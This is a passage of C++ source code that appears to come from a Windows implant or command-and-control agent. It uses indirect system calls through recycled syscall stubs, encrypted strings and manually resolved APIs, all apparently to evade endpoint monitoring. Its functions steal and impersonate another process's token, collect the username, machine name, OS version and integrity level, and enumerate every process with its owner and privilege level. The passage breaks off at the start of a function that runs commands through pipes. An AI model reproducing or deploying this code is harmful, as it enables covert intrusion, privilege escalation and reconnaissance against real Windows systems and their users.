        }

        SyscallPrepare(SystemCalls::SysTable.SysNtOpenProcessToken.wSyscallNr, SystemCalls::SysTable.SysNtOpenProcessToken.pRecycled);
        NtStatus = SysNtOpenProcessToken(pHandle, TOKEN_READ | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE, &tHandle);
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::OPENINGTOKEN_CRYPT), NtStatus));
        }

        SyscallPrepare(SystemCalls::SysTable.SysNtDuplicateToken.wSyscallNr, SystemCalls::SysTable.SysNtDuplicateToken.pRecycled);
        NtStatus = SysNtDuplicateToken(tHandle, MAXIMUM_ALLOWED, &toa, FALSE, TokenImpersonation, &nToken);
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::DUPLICATINGTOKEN_CRYPT), NtStatus));
        }

        SyscallPrepare(SystemCalls::SysTable.SysNtSetInformationThread.wSyscallNr, SystemCalls::SysTable.SysNtSetInformationThread.pRecycled);
        NtStatus = SysNtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &nToken, sizeof(HANDLE));
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::SETTINGTHREADINFORMATION_CRYPT), NtStatus));
        }

        if (pBuffer) {
            _pRtlFreeHeap(ProcessHeap, 0, pBuffer);
        }

        // Close handles if they were opened
        if (pHandle) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(pHandle);
        }
        if (tHandle) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(tHandle);
        }
        if (nToken) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(nToken);
        }
    }
    catch (...) {
        // Clean up resources here if the function exits due to an exception
        if (pBuffer) {
            _pRtlFreeHeap(ProcessHeap, 0, pBuffer);
        }
        if (pHandle) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(pHandle);
        }
        if (tHandle) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(tHandle);
        }
        if (nToken) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(nToken);
        }
        // Rethrow the exception to the caller
        throw;
    }
}

void Instance::GetUsername() {
    HANDLE cToken = NULL;
    PTOKEN_USER tUser = nullptr;
    PVOID ProcessHeap = SystemCalls::Peb->ProcessHeap;
    SecureString result;

    try {
        pLookupAccountSidA _pLookupAccountSidA = (pLookupAccountSidA)Win32::AdvApi32Table.pLookupAccountSidA.pAddress;

        // Open the process token
        SyscallPrepare(SystemCalls::SysTable.SysNtOpenProcessToken.wSyscallNr, SystemCalls::SysTable.SysNtOpenProcessToken.pRecycled);
        NtStatus = SysNtOpenProcessToken(Process, TOKEN_QUERY, &cToken);
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::OPENINGTOKEN_CRYPT), NtStatus));
        }

        // Get size for the buffer
        ULONG ReturnLength = 0;
        SyscallPrepare(SystemCalls::SysTable.SysNtQueryInformationToken.wSyscallNr, SystemCalls::SysTable.SysNtQueryInformationToken.pRecycled);
        NtStatus = SysNtQueryInformationToken(cToken, TokenUser, NULL, 0, &ReturnLength);
        if (ReturnLength == 0) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::QUERYINGTOKEN_CRYPT), NtStatus));
        }

        // Allocate the buffer
        std::vector<char> userBuffer(ReturnLength);
        tUser = reinterpret_cast<PTOKEN_USER>(userBuffer.data());
        SyscallPrepare(SystemCalls::SysTable.SysNtQueryInformationToken.wSyscallNr, SystemCalls::SysTable.SysNtQueryInformationToken.pRecycled);
        NtStatus = SysNtQueryInformationToken(cToken, TokenUser, tUser, ReturnLength, &ReturnLength);
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::QUERYINGTOKEN_CRYPT), NtStatus));
        }

        // Get the sizes...
        DWORD uLength = 0, dLength = 0;
        SID_NAME_USE snu;
        _pLookupAccountSidA(NULL, tUser->User.Sid, NULL, &uLength, NULL, &dLength, &snu);
        std::vector<char> username(uLength), domain(dLength);
        if (!_pLookupAccountSidA(NULL, tUser->User.Sid, username.data(), &uLength, domain.data(), &dLength, &snu)) {
            throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::SIDLOOKUP_CRYPT)));
        }

        // Construct the result
        result.assign(domain.data(), dLength);
        result.append("/");
        result.append(username.data(), uLength);
        Username = result;

        // Clean up resources here
        if (cToken) {
			SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
			SysNtClose(cToken);
		}
    }
    catch (...) {
        // If an exception was caught, make sure to close the token handle to avoid leaking it
        if (cToken) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(cToken);
        }
        // Rethrow the exception to be handled by the caller
        throw;
    }
}

void Instance::GetMachineName() {
    HANDLE Key = NULL;
    PVOID ProcessHeap = SystemCalls::Peb->ProcessHeap;
    SecureString result;

    try {
        pRtlInitUnicodeString _pRtlInitUnicodeString = (pRtlInitUnicodeString)Win32::NtdllTable.pRtlInitUnicodeString.pAddress;

        // Initialize the UNICODE_STRING for registry path and name
        UNICODE_STRING Path, Name;
        // Create the decrypted strings
        SecureWideString decryptedPath = StringCrypt::DecryptString(StringCrypt::COMPUTERNAMEREGISTRY_CRYPT).c_str();
        SecureWideString decryptedName = StringCrypt::DecryptString(StringCrypt::COMPUTERNAME_CRYPT).c_str();

        _pRtlInitUnicodeString(&Path, decryptedPath.c_str());
        _pRtlInitUnicodeString(&Name, decryptedName.c_str());

        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &Path, OBJ_CASE_INSENSITIVE, NULL, NULL);

        // Open the registry key
        SyscallPrepare(SystemCalls::SysTable.SysNtOpenKey.wSyscallNr, SystemCalls::SysTable.SysNtOpenKey.pRecycled);
        NtStatus = SysNtOpenKey(&Key, KEY_QUERY_VALUE, &oa);
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::OPENINGKEY_CRYPT), NtStatus));
        }

        // Query the value to get its size
        ULONG ResultLength = 0;
        SyscallPrepare(SystemCalls::SysTable.SysNtQueryValueKey.wSyscallNr, SystemCalls::SysTable.SysNtQueryValueKey.pRecycled);
        NtStatus = SysNtQueryValueKey(Key, &Name, KeyValuePartialInformation, NULL, 0, &ResultLength);
        if (!NT_SUCCESS(NtStatus) && ResultLength == 0) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::QUERYINGKEY_CRYPT), NtStatus));
        }

        // Allocate a buffer for the value
        std::vector<char> valueBuffer(ResultLength);
        PKEY_VALUE_PARTIAL_INFORMATION PartialInfo = reinterpret_cast<PKEY_VALUE_PARTIAL_INFORMATION>(valueBuffer.data());

        // Query the value again to get the data
        SyscallPrepare(SystemCalls::SysTable.SysNtQueryValueKey.wSyscallNr, SystemCalls::SysTable.SysNtQueryValueKey.pRecycled);
        NtStatus = SysNtQueryValueKey(Key, &Name, KeyValuePartialInformation, PartialInfo, ResultLength, &ResultLength);
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::QUERYINGKEY_CRYPT), NtStatus));
        }

        // Convert the UNICODE_STRING to a SecureString
        WCHAR* wideBuffer = reinterpret_cast<WCHAR*>(PartialInfo->Data);
        SecureWideString wideResult(wideBuffer, (PartialInfo->DataLength / sizeof(WCHAR)) - 1); // -1 to exclude the null terminator
        result.assign(wideResult.begin(), wideResult.end()); // Convert to SecureString
        MachineName = result;

        // Close the registry key
        SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
        SysNtClose(Key);
    }
    catch (const SecureException& e) {
        // Clean up resources here if the function exits due to an exception
        if (Key) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(Key);
        }
        // Rethrow the exception to be handled by the caller
        throw;
    }
    catch (...) {
        // Clean up resources here if the function exits due to an exception
        if (Key) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(Key);
        }
        // Rethrow the exception to be handled by the caller
        throw;
    }
}

void Instance::GetOSVersion() {
    HANDLE Key = NULL;
    PVOID ProcessHeap = SystemCalls::Peb->ProcessHeap;

    try {
        pRtlInitUnicodeString _pRtlInitUnicodeString = (pRtlInitUnicodeString)Win32::NtdllTable.pRtlInitUnicodeString.pAddress;

        // Initialize the UNICODE_STRING for registry path and name
        UNICODE_STRING Path, OS, Version, Build;
        // Create the decrypted strings
        SecureWideString decryptedPath = StringCrypt::DecryptString(StringCrypt::CURRENTVERSIONREGISTRY_CRYPT).c_str();
        SecureWideString decryptedOS = StringCrypt::DecryptString(StringCrypt::PRODUCTNAME_CRYPT).c_str();
        SecureWideString decryptedVersion = StringCrypt::DecryptString(StringCrypt::DISPLAYVERSION_CRYPT).c_str();
        SecureWideString decryptedBuild = StringCrypt::DecryptString(StringCrypt::CURRENTBUILD_CRYPT).c_str();

        _pRtlInitUnicodeString(&Path, decryptedPath.c_str());
        _pRtlInitUnicodeString(&OS, decryptedOS.c_str());
        _pRtlInitUnicodeString(&Version, decryptedVersion.c_str());
        _pRtlInitUnicodeString(&Build, decryptedBuild.c_str());

        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &Path, OBJ_CASE_INSENSITIVE, NULL, NULL);

        // Open the registry key
        SyscallPrepare(SystemCalls::SysTable.SysNtOpenKey.wSyscallNr, SystemCalls::SysTable.SysNtOpenKey.pRecycled);
        NtStatus = SysNtOpenKey(&Key, KEY_QUERY_VALUE, &oa);
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::OPENINGKEY_CRYPT), NtStatus));
        }

        // Function to query the value and append data to result
        auto QueryValueAndAppend = [&](UNICODE_STRING& ValueName, SecureWideString& wStr) {
            ULONG ResultLength = 0;
            SyscallPrepare(SystemCalls::SysTable.SysNtQueryValueKey.wSyscallNr, SystemCalls::SysTable.SysNtQueryValueKey.pRecycled);
            NtStatus = SysNtQueryValueKey(Key, &ValueName, KeyValuePartialInformation, NULL, 0, &ResultLength);
            if (ResultLength == 0) {
                throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::QUERYINGKEY_CRYPT), NtStatus));
            }

            std::vector<char> valueBuffer(ResultLength);
            PKEY_VALUE_PARTIAL_INFORMATION PartialInfo = reinterpret_cast<PKEY_VALUE_PARTIAL_INFORMATION>(valueBuffer.data());

            SyscallPrepare(SystemCalls::SysTable.SysNtQueryValueKey.wSyscallNr, SystemCalls::SysTable.SysNtQueryValueKey.pRecycled);
            NtStatus = SysNtQueryValueKey(Key, &ValueName, KeyValuePartialInformation, PartialInfo, ResultLength, &ResultLength);
            if (!NT_SUCCESS(NtStatus)) {
                throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::QUERYINGKEY_CRYPT), NtStatus));
            }

            WCHAR* wideBuffer = reinterpret_cast<WCHAR*>(PartialInfo->Data);
            SecureWideString wideResult(wideBuffer, (PartialInfo->DataLength / sizeof(WCHAR)) - 1); // -1 to exclude the null terminator
            wStr.append(wideResult.begin(), wideResult.end());
        };

        SecureWideString wResult;
        QueryValueAndAppend(OS, wResult);
        wResult.append(L" ");
        QueryValueAndAppend(Version, wResult);
        wResult.append(L" ");
        QueryValueAndAppend(Build, wResult);

        OperatingSystem.assign(wResult.begin(), wResult.end());

        // Close the registry key
        SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
        SysNtClose(Key);
    }
    catch (const SecureException& e) {
        // If an exception was caught, make sure to close the registry key handle to avoid leaking it
        if (Key) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(Key);
        }
        // Rethrow the exception to be handled by the caller
        throw;
    }
    catch (...) {
        // If an exception was caught, make sure to close the registry key handle to avoid leaking it
        if (Key) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(Key);
        }
        // Rethrow the exception to be handled by the caller
        throw;
    }
}

/*void Instance::GetOSVersion() {
    // The user mode address of KUSER_SHARED_DATA is always 0x7ffe0000
    DWORD kUserAddress = 0x7ffe0000;

    // NtMajorVersion is at offset 0x26C
    DWORD ntMajorVersion = *(DWORD*)(kUserAddress + 0x26C);

    // NtMinorVersion is at offset 0x270
    DWORD ntMinorVersion = *(DWORD*)(kUserAddress + 0x270);

    // NtBuildNumber is at offset 0x260
    DWORD ntBuildNumber = *(DWORD*)(kUserAddress + 0x260);

    printf("Windows version: %d.%d.%d\n", ntMajorVersion, ntMinorVersion, ntBuildNumber);
}*/

void Instance::GetIntegrityLevel() {
    HANDLE hToken = NULL;
    PVOID ProcessHeap = SystemCalls::Peb->ProcessHeap;
    SecureString result;

    try {
        pGetSidSubAuthority _pGetSidSubAuthority = (pGetSidSubAuthority)Win32::AdvApi32Table.pGetSidSubAuthority.pAddress;

        // Open the process token
        SyscallPrepare(SystemCalls::SysTable.SysNtOpenProcessToken.wSyscallNr, SystemCalls::SysTable.SysNtOpenProcessToken.pRecycled);
        NtStatus = SysNtOpenProcessToken(Process, TOKEN_QUERY, &hToken);
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::OPENINGTOKEN_CRYPT), NtStatus));
        }

        // Get the size required for the buffer
        ULONG ReturnLength = 0;
        SyscallPrepare(SystemCalls::SysTable.SysNtQueryInformationToken.wSyscallNr, SystemCalls::SysTable.SysNtQueryInformationToken.pRecycled);
        NtStatus = SysNtQueryInformationToken(hToken, TokenIntegrityLevel, NULL, 0, &ReturnLength);
        if (ReturnLength == 0) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::QUERYINGTOKEN_CRYPT), NtStatus));
        }

        // Allocate the buffer
        std::vector<char> tokenILBuffer(ReturnLength);
        PTOKEN_MANDATORY_LABEL pTokenIL = reinterpret_cast<PTOKEN_MANDATORY_LABEL>(tokenILBuffer.data());

        // Query the token information
        SyscallPrepare(SystemCalls::SysTable.SysNtQueryInformationToken.wSyscallNr, SystemCalls::SysTable.SysNtQueryInformationToken.pRecycled);
        NtStatus = SysNtQueryInformationToken(hToken, TokenIntegrityLevel, pTokenIL, ReturnLength, &ReturnLength);
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::QUERYINGTOKEN_CRYPT), NtStatus));
        }

        // Get the integrity level
        DWORD dwIntegrityLevel = *_pGetSidSubAuthority(pTokenIL->Label.Sid, 0);

        // Determine the integrity level string
        if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
            result = StringCrypt::DecryptString(StringCrypt::LOW_CRYPT);
        }
        else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
            result = StringCrypt::DecryptString(StringCrypt::MEDIUM_CRYPT);
        }
        else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
            result = StringCrypt::DecryptString(StringCrypt::HIGH_CRYPT);
        }
        else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
            result = StringCrypt::DecryptString(StringCrypt::SYSTEM_CRYPT);
        }
        else {
            result = StringCrypt::DecryptString(StringCrypt::UNKNOWN_CRYPT);
        }

        IntegrityLevel = result;

        // Close the process token
        SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
        SysNtClose(hToken);
    }
    catch (const SecureException& e) {
        // If an exception was caught, make sure to close the token handle to avoid leaking it
        if (hToken) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(hToken);
        }
        // Rethrow the exception to be handled by the caller
        throw;
    }
    catch (...) {
        // If an exception was caught, make sure to close the token handle to avoid leaking it
        if (hToken) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(hToken);
        }
        // Rethrow the exception to be handled by the caller
        throw;
    }
}

void CALLBACK Instance::ListProcesses(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work) {    
    //auto context = reinterpret_cast<WorkItemContext<SpecificType1, SpecificType2>*>(Context);
    auto context = reinterpret_cast<SecureTask*>(Context);
    
    pRtlZeroMemory _pRtlZeroMemory = (pRtlZeroMemory)Win32::NtdllTable.pRtlZeroMemory.pAddress;
    pLookupAccountSidA _pLookupAccountSidA = (pLookupAccountSidA)Win32::AdvApi32Table.pLookupAccountSidA.pAddress;
    pGetSidSubAuthority _pGetSidSubAuthority = (pGetSidSubAuthority)Win32::AdvApi32Table.pGetSidSubAuthority.pAddress;
    pRtlAllocateHeap _pRtlAllocateHeap = (pRtlAllocateHeap)Win32::NtdllTable.pRtlAllocateHeap.pAddress;
    pRtlFreeHeap _pRtlFreeHeap = (pRtlFreeHeap)Win32::NtdllTable.pRtlFreeHeap.pAddress;

    PTOKEN_MANDATORY_LABEL pTokenIL = NULL;
    PSYSTEM_PROCESS_INFORMATION pProcInfo = NULL;
    PTOKEN_USER tUser = NULL;
    SID_NAME_USE snu;
    ULONG ReturnLength = 0;
    DWORD uLength = 0, dLength = 0, dwBufSize = 0x1000;
    PVOID pBuffer = NULL, ProcessHeap = SystemCalls::Peb->ProcessHeap;
    SecureString usernameResult, integrityLevelResult, finalResult;

    HANDLE pHandle = NULL, pToken = NULL;
    OBJECT_ATTRIBUTES oa, toa;
    CLIENT_ID ci;

    _pRtlZeroMemory(&oa, sizeof(oa));
    _pRtlZeroMemory(&ci, sizeof(ci));

    // Native psnapshot
    do {
        pBuffer = _pRtlAllocateHeap(ProcessHeap, 0, dwBufSize);
        if (!pBuffer) {
            // Handle allocation failure
            break;
        }

        SyscallPrepare(SystemCalls::SysTable.SysNtQuerySystemInformation.wSyscallNr, SystemCalls::SysTable.SysNtQuerySystemInformation.pRecycled);
        NtStatus = SysNtQuerySystemInformation(SystemProcessInformation, pBuffer, dwBufSize, &dwBufSize);
        if (!NT_SUCCESS(NtStatus)) {
            _pRtlFreeHeap(ProcessHeap, 0, pBuffer);
            pBuffer = nullptr;
            if (NtStatus != STATUS_INFO_LENGTH_MISMATCH) {
                // If the failure is not due to a mismatched size, handle other errors
                throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::GETTINGSYSTEMINFORMATION_CRYPT), NtStatus));
            }
        }
    } while (NtStatus == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(NtStatus)) {
        throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::GETTINGSYSTEMINFORMATION_CRYPT), NtStatus));
    }
        
    int count = 0;
    pProcInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
    do {
        count++;        
        ci.UniqueProcess = pProcInfo->UniqueProcessId;
        ci.UniqueThread = NULL;

        // Initial open
        SyscallPrepare(SystemCalls::SysTable.SysNtOpenProcess.wSyscallNr, SystemCalls::SysTable.SysNtOpenProcess.pRecycled);
        NtStatus = SysNtOpenProcess(&pHandle, PROCESS_QUERY_INFORMATION, &oa, &ci);
        if (!NT_SUCCESS(NtStatus)) {
#ifdef DEBUG
            printf("[-] Failed opening process: 0x%x\n", NtStatus);
#endif
            pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
            continue;
        }
        // Same as above
        SyscallPrepare(SystemCalls::SysTable.SysNtOpenProcessToken.wSyscallNr, SystemCalls::SysTable.SysNtOpenProcessToken.pRecycled);
        NtStatus = SysNtOpenProcessToken(pHandle, TOKEN_QUERY, &pToken);
        if (!NT_SUCCESS(NtStatus)) {
#ifdef DEBUG
            printf("[-] Failed opening token: 0x%x\n", NtStatus);
#endif
            pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
            continue;
        }
        // Get user
        SyscallPrepare(SystemCalls::SysTable.SysNtQueryInformationToken.wSyscallNr, SystemCalls::SysTable.SysNtQueryInformationToken.pRecycled);
        NtStatus = SysNtQueryInformationToken(pToken, TokenUser, NULL, 0, &ReturnLength);
        if (ReturnLength == 0) {
            pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
            continue;
        }
        tUser = (PTOKEN_USER)_pRtlAllocateHeap(ProcessHeap, 0, ReturnLength);
        SyscallPrepare(SystemCalls::SysTable.SysNtQueryInformationToken.wSyscallNr, SystemCalls::SysTable.SysNtQueryInformationToken.pRecycled);
        NtStatus = SysNtQueryInformationToken(pToken, TokenUser, tUser, ReturnLength, &ReturnLength);
        if (!NT_SUCCESS(NtStatus)) {
#ifdef DEBUG
            printf("[-] Failed querying token: 0x%x\n", NtStatus);
#endif
            pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
            continue;
        }
        uLength = dLength = 0;
        _pLookupAccountSidA(NULL, tUser->User.Sid, NULL, &uLength, NULL, &dLength, &snu);
        std::vector<char> username(uLength);
        std::vector<char> domain(dLength);
        if (!_pLookupAccountSidA(NULL, tUser->User.Sid, username.data(), &uLength, domain.data(), &dLength, &snu)) {
#ifdef DEBUG
            printf("[-] LookupAccountSid failed!");
#endif
            pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
            continue;
        }
        usernameResult = SecureString(domain.begin(), domain.end());
        usernameResult.append("/");
        usernameResult.append(SecureString(username.begin(), username.end()).c_str());

        _pRtlFreeHeap(ProcessHeap, 0, tUser);
        // Get integrity
        SyscallPrepare(SystemCalls::SysTable.SysNtQueryInformationToken.wSyscallNr, SystemCalls::SysTable.SysNtQueryInformationToken.pRecycled);
        NtStatus = SysNtQueryInformationToken(pToken, TokenIntegrityLevel, NULL, 0, &ReturnLength);
        if (ReturnLength == 0) {
            pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
            continue;
        }
        pTokenIL = (PTOKEN_MANDATORY_LABEL)_pRtlAllocateHeap(ProcessHeap, 0, ReturnLength);
        SyscallPrepare(SystemCalls::SysTable.SysNtQueryInformationToken.wSyscallNr, SystemCalls::SysTable.SysNtQueryInformationToken.pRecycled);
        NtStatus = SysNtQueryInformationToken(pToken, TokenIntegrityLevel, pTokenIL, ReturnLength, &ReturnLength);
        if (!NT_SUCCESS(NtStatus)) {
#ifdef DEBUG
            printf("[-] Failed querying token: 0x%x\n", NtStatus);
#endif
            pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
            continue;
        }

        DWORD dwIntegrityLevel = *_pGetSidSubAuthority(pTokenIL->Label.Sid, 0);

        if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
            integrityLevelResult = StringCrypt::DecryptString(StringCrypt::LOW_CRYPT);
        }
        else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
            integrityLevelResult = StringCrypt::DecryptString(StringCrypt::MEDIUM_CRYPT);
        }
        else if (dwIntegrityLevel == SECURITY_MANDATORY_HIGH_RID) {
            integrityLevelResult = StringCrypt::DecryptString(StringCrypt::HIGH_CRYPT);
        }
        else if (dwIntegrityLevel == SECURITY_MANDATORY_SYSTEM_RID) {
            integrityLevelResult = StringCrypt::DecryptString(StringCrypt::SYSTEM_CRYPT);
        }

        _pRtlFreeHeap(ProcessHeap, 0, pTokenIL);

        // Construct final string for this process        
        finalResult.append(StringCrypt::DecryptString(StringCrypt::PROCESSCOLON_CRYPT).c_str());
        finalResult.append(std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(pProcInfo->ImageName.Buffer).c_str());
        finalResult.append(StringCrypt::DecryptString(StringCrypt::PIPEIDCOLON_CRYPT).c_str());
        finalResult.append(std::to_string((ULONG_PTR)pProcInfo->UniqueProcessId).c_str());
        finalResult.append(StringCrypt::DecryptString(StringCrypt::PIPEUSERCOLON_CRYPT).c_str());
        finalResult.append(usernameResult.c_str());
        finalResult.append(StringCrypt::DecryptString(StringCrypt::PIPETOKENCOLON_CRYPT).c_str());
        finalResult.append(integrityLevelResult.c_str());
        finalResult.append("\n");        

        SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
        SysNtClose(pToken);
        SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
        SysNtClose(pHandle);
        pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
    } while (pProcInfo->NextEntryOffset != 0);

    //printf("Count: %d\n", count);    
    //printf("%s", finalResult.c_str());
    _pRtlFreeHeap(ProcessHeap, 0, pBuffer);
    SyscallPrepare(SystemCalls::SysTable.SysNtSetEvent.wSyscallNr, SystemCalls::SysTable.SysNtSetEvent.pRecycled);
    // If we fail to set the event, it will timeout regardless so no need to check for errors
    NtStatus = SysNtSetEvent(context->CompletionEvent, NULL);
    context->Result = std::make_unique<SecureString>(finalResult);
    context->Success = true;
}

SecureString Instance::JoinArguments(const std::vector<std::unique_ptr<SecureString>>& arguments) {
    SecureString result;
    bool inDoubleQuotes = false;
    bool inSingleQuotes = false;

    for (const auto& argPtr : arguments) {
        if (argPtr) {
            const SecureString& arg = *argPtr;
            const char* cstr = arg.c_str(); // Assuming SecureString has a c_str() method

            for (size_t j = 0; cstr[j] != '\0'; ++j) {
                char ch = cstr[j];
                if (ch == '\"' && !inSingleQuotes) {
                    inDoubleQuotes = !inDoubleQuotes;
                }
                if (ch == '\'' && !inDoubleQuotes) {
                    inSingleQuotes = !inSingleQuotes;
                }

                result.append(ch); // Append the current character
            }

            // Add a space after each argument if it's not the last argument
            // and we're not inside a quote
            if (&argPtr != &arguments.back() && !inDoubleQuotes && !inSingleQuotes) {
                result.append(' ');
            }
        }
    }

    return result;
}

bool Instance::IsValidUTF8(const SecureString& str) {
    int c, i, ix, n, j;
    for (i = 0, ix = str.size(); i < ix; i++) {
        c = (unsigned char)str[i];
        // ASCII
        if (c <= 0x7f) continue;

        // Non-ASCII: Ensure the byte is a valid UTF-8 leading byte
        if (c >= 0x80 && c <= 0xBF) return false;
        if (c >= 0xFE) return false;
        n = 0;
        if (c >= 0xC0 && c <= 0xDF) n = 1;
        else if (c >= 0xE0 && c <= 0xEF) n = 2;
        else if (c >= 0xF0 && c <= 0xF7) n = 3;
        else return false;

        // Ensure the following bytes are valid continuation bytes
        for (j = 0; j < n && i < ix; j++) {
            if ((++i) == ix) return false;
            if ((str[i] & 0xC0) != 0x80) return false;
        }
    }
    return true;
}

std::unique_ptr<SecureString> Instance::SanitizeUTF8(const SecureString& str) {
    SecureString result;
    result.reserve(str.size()); // Optimize for the case where str is mostly valid

    for (size_t i = 0; i < str.size(); ++i) {
        // Simple check for single-byte (ASCII) characters
        if (static_cast<unsigned char>(str[i]) <= 0x7F) {
            result.append(str[i]);
            continue;
        }

        // Check for valid UTF-8 character
        size_t len = str.size() - i;
        SecureString substr = str.substr(i, len);
        if (IsValidUTF8(substr)) {
            result.append(substr.c_str());
            break;
        }
        else {
            // Handle or replace the invalid character (e.g., with '?')
            result.append('?');
        }
    }

    return std::make_unique<SecureString>(result);
}

void CALLBACK Instance::PipeProc(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work) {
    auto context = reinterpret_cast<SecureTask*>(Context);
    SecureString args = JoinArguments(context->Arguments);

    pCreatePipe _pCreatePipe = (pCreatePipe)Win32::Kernel32Table.pCreatePipe.pAddress;
    pCreateProcessA _pCreateProcessA = (pCreateProcessA)Win32::Kernel32Table.pCreateProcessA.pAddress;
    pPeekNamedPipe _pPeekNamedPipe = (pPeekNamedPipe)Win32::Kernel32Table.pPeekNamedPipe.pAddress;
    pReadFile _pReadFile = (pReadFile)Win32::Kernel32Table.pReadFile.pAddress;
    pWaitForSingleObject _pWaitForSingleObject = (pWaitForSingleObject)Win32::Kernel32Table.pWaitForSingleObject.pAddress;

    SecureString result;
